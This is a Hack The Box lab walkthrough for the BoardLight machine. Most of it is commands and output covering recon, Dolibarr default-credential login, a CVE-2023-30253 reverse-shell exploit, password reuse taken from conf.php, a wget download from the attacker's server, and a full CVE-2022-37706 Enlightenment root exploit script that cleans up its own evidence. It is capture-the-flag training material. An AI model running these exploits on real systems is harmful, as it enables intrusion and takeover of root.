# BoardLight-https://app.hackthebox.com/machines/BoardLight

```bash

ping 10.129.231.37                                                         
PING 10.129.231.37 (10.129.231.37) 56(84) bytes of data.
64 bytes from 10.129.231.37: icmp_seq=1 ttl=63 time=63.8 ms
64 bytes from 10.129.231.37: icmp_seq=2 ttl=63 time=67.2 ms
64 bytes from 10.129.231.37: icmp_seq=3 ttl=63 time=67.2 ms
--- 10.129.231.37 ping statistics ---
8 packets transmitted, 8 received, 0% packet loss, time 7007ms
rtt min/avg/max/mdev = 63.338/65.867/68.962/2.175 ms
```
```bash
nmap -sV -sC 10.129.231.37 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 10:01 EDT
Nmap scan report for 10.129.231.37
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds


```

```bash
# Check Port 80 http Website.

sudo nano /etc/hosts
# Add 10.129.231.37 board.htb

ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/wordlists/wfuzz/general/common.txt -fs 15949

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/wfuzz/general/common.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 347ms]
:: Progress: [951/951] :: Job [1/1] :: 613 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

 sudo echo "10.129.231.37 crm.board.htb" | sudo tee -a /etc/hosts
10.129.231.37 crm.board.htb
# After visting the subdomain, we see a login page. I check default credentials from this link https://www.dolibarr.org/forum/t/login-after-installation/16088/4
# I found out that default credentails are admin : admin
# After we login we can't acess the resources:  Access denied. You try to access to a page, area or feature of a disabled module or without being in an authenticated session or that is not allowed to your user.
```
```bash

# Reverse Shell for Dolibarr 17.0.0 : https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

nc -lvnp 4047
listening on [any] 4047 ...
connect to [10.10.14.24] from (UNKNOWN) [10.129.231.37] 52574
bash: cannot set terminal process group (876): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$

python3 exploit.py http://crm.board.htb admin admin 10.10.14.24 4047  
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection

www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ ls
ls
index.php
styles.css.php
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cd ..
cd ..
www-data@boardlight:~/html/crm.board.htb/htdocs/public$ id            
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@boardlight:~/html/crm.board.htb/htdocs/public$ cd ../../..    
cd ../../..
www-data@boardlight:~/html$ find . -name conf*
find . -name conf*
./crm.board.htb/htdocs/theme/common/fontawesome-5/svgs/brands/confluence.svg
./crm.board.htb/htdocs/theme/common/fontawesome-5/js/conflict-detection.js
./crm.board.htb/htdocs/theme/common/fontawesome-5/js/conflict-detection.min.js
./crm.board.htb/htdocs/theme/md/ckeditor/config.js
./crm.board.htb/htdocs/theme/eldy/ckeditor/config.js
./crm.board.htb/htdocs/includes/ckeditor/ckeditor/config.js
./crm.board.htb/htdocs/includes/ckeditor/ckeditor/plugins/exportpdf/tests/manual/configfilename.html
./crm.board.htb/htdocs/includes/ckeditor/ckeditor/plugins/exportpdf/tests/manual/configfilename.md
./crm.board.htb/htdocs/includes/ckeditor/ckeditor/plugins/smiley/images/confused_smile.png
./crm.board.htb/htdocs/includes/ckeditor/ckeditor/plugins/smiley/images/confused_smile.gif
./crm.board.htb/htdocs/includes/tecnickcom/tcpdf/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/es/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/it/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/ru/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/pl/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/en/uk/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/bg/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/da/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/nl/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/fr/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/fi/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/sv/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/tr/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/hu/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/cs/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/pt/br/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/pt/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/no/config
./crm.board.htb/htdocs/includes/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Calculation/locale/de/config
./crm.board.htb/htdocs/includes/webklex/php-imap/src/config
./crm.board.htb/htdocs/stripe/config.php
./crm.board.htb/htdocs/core/filemanagerdol/connectors/php/config.inc.php
./crm.board.htb/htdocs/core/class/conf.class.php
./crm.board.htb/htdocs/conf
./crm.board.htb/htdocs/conf/conf.php.old
./crm.board.htb/htdocs/conf/conf.php.example
./crm.board.htb/htdocs/conf/conf.php
./crm.board.htb/htdocs/eventorganization/conferenceorboothattendee_card.php
./crm.board.htb/htdocs/eventorganization/conferenceorboothattendee_note.php
./crm.board.htb/htdocs/eventorganization/conferenceorbooth_contact.php
./crm.board.htb/htdocs/eventorganization/conferenceorbooth_card.php
./crm.board.htb/htdocs/eventorganization/conferenceorbooth_list.php
./crm.board.htb/htdocs/eventorganization/class/conferenceorbooth.class.php
./crm.board.htb/htdocs/eventorganization/class/conferenceorboothattendee.class.php
./crm.board.htb/htdocs/eventorganization/conferenceorbooth_document.php
./crm.board.htb/htdocs/eventorganization/conferenceorboothattendee_list.php

./crm.board.htb/htdocs/conf
./crm.board.htb/htdocs/conf/conf.php.old
./crm.board.htb/htdocs/conf/conf.php.example
./crm.board.htb/htdocs/conf/conf.php


www-data@boardlight:~/html$ cat ./crm.board.htb/htdocs/conf/conf.php

$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';

www-data@boardlight:~/html$ cd /home
cd /home
www-data@boardlight:/home$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash

www-data@boardlight:/home$ su larissa
su larissa
Password: serverfun2$2023!!
id
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
ls
larissa
cd larissa
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
user.txt
Videos
cat user.txt 
6b76a1d9d443ecccc0dff43061223c2a

```

```bash

$ curl -L -o ~/Downloads/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.231.37 - - [07/Sep/2024 09:28:49] "GET /linpeas.sh HTTP/1.1" 200 -


wget http://10.10.14.24:8000/linpeas.sh
--2024-09-07 06:28:50--  http://10.10.14.24:8000/linpeas.sh
Connecting to 10.10.14.24:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 820617 (801K) [text/x-sh]
Saving to: ‘linpeas.sh’
     0K .......... .......... .......... .......... ..........  6%  380K 2s
    50K .......... .......... .......... .......... .......... 12%  797K 1s
   100K .......... .......... .......... .......... .......... 18% 5.56M 1s
   150K .......... .......... .......... .......... .......... 24%  874K 1s
   200K .......... .......... .......... .......... .......... 31% 10.3M 1s
   250K .......... .......... .......... .......... .......... 37% 6.91M 0s
   300K .......... .......... .......... .......... .......... 43% 11.6M 0s
   350K .......... .......... .......... .......... .......... 49%  942K 0s
   400K .......... .......... .......... .......... .......... 56% 11.2M 0s
   450K .......... .......... .......... .......... .......... 62% 6.77M 0s
   500K .......... .......... .......... .......... .......... 68%  978K 0s
   550K .......... .......... .......... .......... .......... 74% 6.44M 0s
   600K .......... .......... .......... .......... .......... 81% 10.9M 0s
   650K .......... .......... .......... .......... .......... 87% 11.0M 0s
   700K .......... .......... .......... .......... .......... 93%  946K 0s
   750K .......... .......... .......... .......... .......... 99% 11.4M 0s
   800K .                                                     100% 16.0M=0.5s

2024-09-07 06:28:51 (1.68 MB/s) - ‘linpeas.sh’ saved [820617/820617]

# You could also connect with ssh like this ssh larissa@board.htb                                           
chmod +x linpeas.sh
./linpeas.sh
Files with Interesting Permissions ╠══════════════════════                 
                      ╚════════════════════════════════════╝                                       
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                   
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                          
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)                                                                        
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)                                                                   
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)                                                                  
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)                                                
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 467K Jan  2  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K Apr  9 08:34 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                           
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                                 
-rwsr-xr-x 1 root root 67K Apr  9 08:34 /usr/bin/su
-rwsr-xr-x 1 root root 84K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Apr  9 08:34 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 87K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 67K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 15K Oct 27  2023 /usr/bin/vmware-user-suid-wrapper

# https://www.exploit-db.com/exploits/51180

# https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2022-37706


sudo nano exploitt.sh
echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

# The actual problem
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Welcome to the rabbit hole :)"

echo -e "If it is not found in fstab, big deal :D "
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

read -p "Press any key to clean the evedence..."
echo -e "Please wait... "

sleep 5
rm -rf /tmp/exploit
rm -rf /tmp/net
echo -e "Done; Everything is clear ;)"

$ python3 -m http.server 8000

ssh larissa@board.htb
larissa@board.htb's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

larissa@boardlight:~$ wget http://10.10.14.24:8000/exploitt.sh
--2024-09-07 15:11:43--  http://10.10.14.24:8000/exploitt.sh
Connecting to 10.10.14.24:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 937 [text/x-sh]
Saving to: ‘exploitt.sh.1’

exploitt.sh.1            100%[=================================>]     937  --.-KB/s    in 0s      

2024-09-07 15:11:43 (11.2 MB/s) - ‘exploitt.sh.1’ saved [937/937]

# I couldn't download exploitt.sh from my previous connection so i used ssh.

larissa@boardlight:~$ chmod +x exploitt.sh.1
larissa@boardlight:~$ ./exploitt.sh.1
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Welcome to the rabbit hole :)
If it is not found in fstab, big deal :D 
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
# cd /root
# ls
root.txt  snap
# cat root.txt
a6178016f17ada519c972893ea37b924

```
